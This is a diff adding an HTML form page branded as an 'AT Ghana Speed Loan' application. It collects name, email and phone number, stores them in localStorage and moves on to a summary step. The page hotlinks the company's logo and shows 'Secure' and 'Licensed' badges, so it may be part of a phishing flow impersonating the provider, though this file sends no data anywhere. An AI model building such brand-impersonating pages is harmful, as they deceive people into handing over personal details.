@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Personal Details - AT Ghana Speed Loan</title>
+    <link rel="icon" href="https://www.at.com.gh/favicon.ico" type="image/x-icon">
+    <meta name="theme-color" content="#E30613">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
+      
+        :root {
+            --primary: #E30613;
+            --primary-dark: #b71c1c;
+            --primary-light: #ffebed;
+            --accent: #FFD700;
+            --dark: #121212;
+            --gray-900: #1a1a1a;
+            --gray-800: #2d2d2d;
+            --gray-700: #4a4a4a;
+            --gray-600: #6c757d;
+            --gray-100: #f8f9fc;
+            --white: #ffffff;
+            --success: #2b8a3e;
+            --error: #dc3545;
+            --shadow-soft: 0 10px 30px rgba(0,0,0,0.04);
+            --shadow-hard: 0 20px 50px rgba(0,0,0,0.1);
+            --radius-lg: 24px;
+            --radius-md: 16px;
+            --transition: all 0.4s cubic-bezier(0.165, 0.84, 0.44, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--gray-100);
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* ===== NAVIGATION ===== */
+        nav {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(12px);
+            padding: 12px 0;
+            margin-bottom: 24px;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .nav-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .back-link {
+            width: 36px;
+            height: 36px;
+            background: var(--gray-100);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--gray-700);
+            text-decoration: none;
+            transition: var(--transition);
+            font-size: 14px;
+        }
+
+        .back-link:hover {
+            background: var(--primary-light);
+            color: var(--primary);
+        }
+
+        .logo-img {
+            height: 42px;
+            width: auto;
+        }
+
+        .trust-badges {
+            display: flex;
+            gap: 8px;
+        }
+
+        .trust-tag {
+            background: var(--primary-light);
+            color: var(--primary);
+            font-size: 10px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== FORM CARD ===== */
+        .form-card {
+            background: var(--white);
+            border-radius: var(--radius-lg);
+            padding: 40px 24px;
+            box-shadow: var(--shadow-soft);
+            margin-bottom: 40px;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .form-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--gray-900);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        /* ===== PROGRESS ===== */
+        .progress-section {
+            margin-bottom: 32px;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--gray-600);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: var(--gray-100);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66%;
+            height: 100%;
+            background: var(--primary);
+            border-radius: 10px;
+        }
+
+        /* ===== FORM GROUPS ===== */
+        .name-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--gray-700);
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gray-600);
+            font-size: 14px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 16px 16px 45px;
+            background: var(--gray-100);
+            border: 2px solid var(--gray-100);
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-900);
+            outline: none;
+            transition: var(--transition);
+            font-family: inherit;
+        }
+
+        .form-input:focus {
+            background: var(--white);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(227, 6, 19, 0.05);
+        }
+
+        .form-input::placeholder {
+            color: var(--gray-600);
+            font-weight: 400;
+            opacity: 0.5;
+        }
+
+        .phone-prefix {
+            position: absolute;
+            left: 45px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-weight: 700;
+            color: var(--gray-900);
+        }
+
+        .phone-input {
+            padding-left: 90px;
+        }
+
+        /* ===== ERROR STATES ===== */
+        .form-input.invalid {
+            border-color: var(--error);
+            background: #fff8f8;
+        }
+
+        .field-error {
+            color: var(--error);
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 6px;
+            display: none;
+            padding-left: 4px;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-group {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 12px;
+            margin-top: 40px;
+        }
+
+        .btn {
+            padding: 18px;
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            transition: var(--transition);
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-prev {
+            background: var(--gray-100);
+            color: var(--gray-700);
+        }
+
+        .btn-prev:hover {
+            background: #e2e8f0;
+        }
+
+        .btn-next {
+            background: var(--primary);
+            color: var(--white);
+            box-shadow: 0 8px 25px rgba(227, 6, 19, 0.2);
+        }
+
+        .btn-next:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(227, 6, 19, 0.3);
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            padding: 40px 0;
+            text-align: center;
+            border-top: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .footer-logo {
+            height: 30px;
+            opacity: 0.5;
+            margin-bottom: 16px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: var(--gray-600);
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .name-row {
+                grid-template-columns: 1fr;
+            }
+            .form-card {
+                padding: 32px 20px;
+            }
+            .form-title {
+                font-size: 24px;
+            }
+            .trust-badges {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="container nav-content">
+        <div class="nav-left">
+            <a href="javascript:history.back()" class="back-link">
+                <i class="fas fa-chevron-left"></i>
+            </a>
+            <img src="https://www.at.com.gh/assets/img/at-logos/at-logo-sm.png" alt="AT Ghana" class="logo-img">
+        </div>
+        <div class="trust-badges">
+            <span class="trust-tag">🔒 Secure</span>
+            <span class="trust-tag">✅ Licensed</span>
+        </div>
+    </div>
+</nav>
+
+<main class="container">
+    <div class="form-card">
+        <div class="form-header">
+            <h1 class="form-title">Personal Details</h1>
+            <p style="font-size: 14px; color: var(--gray-600);">Step 2 of 3: Verification Information</p>
+        </div>
+        
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>Application Progress</span>
+                <span>66% Complete</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <div class="name-row">
+            <div class="form-group">
+                <label class="form-label">First Name</label>
+                <div class="input-wrapper">
+                    <span class="input-icon"><i class="fas fa-user"></i></span>
+                    <input type="text" class="form-input" id="firstName" placeholder="Kwame">
+                </div>
+                <div class="field-error" id="firstNameError">First name is required</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">Last Name</label>
+                <div class="input-wrapper">
+                    <span class="input-icon"><i class="fas fa-user"></i></span>
+                    <input type="text" class="form-input" id="lastName" placeholder="Mensah">
+                </div>
+                <div class="field-error" id="lastNameError">Last name is required</div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Email Address</label>
+            <div class="input-wrapper">
+                <span class="input-icon"><i class="fas fa-envelope"></i></span>
+                <input type="email" class="form-input" id="email" placeholder="kwame.mensah@email.com">
+            </div>
+            <div class="field-error" id="emailError">Valid email is required</div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Phone Number</label>
+            <div class="input-wrapper">
+                <span class="input-icon"><i class="fas fa-mobile-alt"></i></span>
+                <span class="phone-prefix">+233</span>
+                <input type="tel" id="phone" class="form-input phone-input" placeholder="551234567" maxlength="9">
+            </div>
+            <div class="field-error" id="phoneError">Valid 9-digit number is required</div>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn btn-prev" onclick="history.back()">Back</button>
+            <button class="btn btn-next" id="nextBtn">
+                Next Step <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+    </div>
+
+    <footer>
+        <img src="https://www.at.com.gh/assets/img/at-logos/at-logo-sm.png" alt="AT Ghana" class="footer-logo">
+        <p class="footer-text">© 2026 AT Ghana – Licensed Mobile Financial Services Provider</p>
+    </footer>
+</main>
+
+<script>
+    // Pre-fill from localStorage
+    const fields = ['firstName', 'lastName', 'email', 'phone'];
+    fields.forEach(field => {
+        if (localStorage.getItem(field)) {
+            document.getElementById(field).value = localStorage.getItem(field);
+        }
+    });
+
+    const nextBtn = document.getElementById('nextBtn');
+
+    nextBtn.addEventListener('click', function() {
+        const data = {
+            firstName: document.getElementById('firstName').value.trim(),
+            lastName: document.getElementById('lastName').value.trim(),
+            email: document.getElementById('email').value.trim(),
+            phone: document.getElementById('phone').value.trim()
+        };
+
+        // Reset errors
+        document.querySelectorAll('.field-error').forEach(el => el.style.display = 'none');
+        document.querySelectorAll('.form-input').forEach(el => el.classList.remove('invalid'));
+
+        let valid = true;
+
+        if (!data.firstName) {
+            document.getElementById('firstName').classList.add('invalid');
+            document.getElementById('firstNameError').style.display = 'block';
+            valid = false;
+        }
+        if (!data.lastName) {
+            document.getElementById('lastName').classList.add('invalid');
+            document.getElementById('lastNameError').style.display = 'block';
+            valid = false;
+        }
+        if (data.email && (!data.email.includes('@') || !data.email.includes('.'))) {
+            document.getElementById('email').classList.add('invalid');
+            document.getElementById('emailError').style.display = 'block';
+            valid = false;
+        }
+        if (!data.phone || data.phone.length !== 9 || !/^\d{9}$/.test(data.phone)) {
+            document.getElementById('phone').classList.add('invalid');
+            document.getElementById('phoneError').style.display = 'block';
+            valid = false;
+        }
+
+        if (!valid) return;
+
+        // Save and navigate
+        Object.keys(data).forEach(key => localStorage.setItem(key, data[key]));
+        window.location.href = 'summary';
+    });
+</script>
+
+</body>
+</html>
